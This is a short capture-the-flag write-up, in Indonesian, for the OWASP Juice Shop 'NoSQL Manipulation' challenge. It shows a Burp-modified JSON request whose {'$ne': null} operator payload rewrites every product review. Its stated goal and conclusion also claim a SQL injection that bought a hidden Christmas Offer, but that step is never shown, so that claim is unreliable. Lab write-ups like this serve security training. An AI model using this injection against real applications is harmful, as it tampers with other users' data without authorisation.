# Juice Shop Write-up: Nosql Manipulation

## 🎯 Challenge Overview
**Platform:** OWASP Juice Shop  
**Category:** Injection / Data Manipulation  
**Difficulty:** ⭐⭐⭐⭐ (4/6)  

Tujuan challenge ini adalah mengeksploitasi SQL Injection untuk menemukan produk tersembunyi (Christmas Offer) serta memodifikasi review produk melalui manipulasi request.

---

## 🛠 Tools Used
- Web Browser (Chrome / Firefox)
- Developer Tools (Inspect / Network)
- Burp Suite (untuk intercept & modify request)
- JSON Request Editing

---


## 📝 Step 1: Manipulating Product Reviews
ditemukan celah manipulasi review.

1. Kirim review baru via request JSON:  

```http
POST /api/Feedbacks/
{
  "id":"dNXyHLQxzAi8edmyG",
  "message":"One of my favorite"
}
```

<img width="967" height="447" alt="image" src="https://github.com/user-attachments/assets/04d7ca89-3aed-40c3-b124-1f4dcc957035" />


2. Ubah request di Burp Suite untuk **mengedit semua komentar**.  
   Contoh payload:

```http
{
  "id": {
    "$ne": null
  },
  "message": "Kami Ubah Semua Komentar!"
}
```

<img width="1494" height="837" alt="image" src="https://github.com/user-attachments/assets/72dd4504-c57d-4d6a-9d1d-e245a3cb5c45" />


3. Hasilnya, seluruh review berubah:  

<img width="626" height="288" alt="image" src="https://github.com/user-attachments/assets/bced9273-2d16-46ed-8b1d-0be64d7414fa" />

---

## 🏁 Conclusion
- Berhasil mengeksploitasi **SQL Injection** untuk menemukan dan membeli produk tersembunyi (Christmas Offer).  
- Berhasil melakukan **mass review manipulation** dengan JSON injection di endpoint Feedback.  

---
